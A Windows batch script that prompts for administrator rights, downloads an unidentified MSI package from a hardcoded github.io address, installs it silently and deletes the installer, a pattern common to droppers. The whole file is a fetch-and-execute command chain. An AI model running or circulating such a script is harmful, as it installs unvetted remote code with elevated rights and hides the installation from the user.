@echo off
setlocal

:: -------------------------------------------------------------------
:: 1. AUTO-ELEVATE TO ADMINISTRATOR
:: -------------------------------------------------------------------
NET SESSION >nul 2>&1
if %errorLevel% NEQ 0 (
    echo Requesting Administrative Privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: -------------------------------------------------------------------
:: 2. SET CONFIGURATION VARIABLES
:: -------------------------------------------------------------------
set "DOWNLOAD_URL=https://pc1n.github.io/scnv2-5m/scn5mdec.msi"
set "TEMP_MSI=%TEMP%\downloaded_installer.msi"
set "LOG_FILE=%TEMP%\msi_install.log"

:: -------------------------------------------------------------------
:: 3. DOWNLOAD THE MSI FILE
:: -------------------------------------------------------------------
echo Downloading installer from URL...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TEMP_MSI%')"

if not exist "%TEMP_MSI%" (
    echo [ERROR] Download failed or file was not saved. Exiting.
    pause
    exit /b 1
)

echo Download complete.

:: -------------------------------------------------------------------
:: 4. EXECUTE MSI INSTALLATION
:: -------------------------------------------------------------------
echo Installing Application...
msiexec /i "%TEMP_MSI%" /qn /norestart /L*V "%LOG_FILE%"

set INSTALL_RESULT=%ERRORLEVEL%

:: -------------------------------------------------------------------
:: 5. CLEANUP & REPORT STATUS
:: -------------------------------------------------------------------
:: Remove the temporary downloaded MSI file
if exist "%TEMP_MSI%" del /f /q "%TEMP_MSI%"

if %INSTALL_RESULT% EQU 0 (
    echo Installation completed successfully!
) else (
    echo Installation failed with exit code %INSTALL_RESULT%.
    echo Detailed log saved to: %LOG_FILE%
)

pause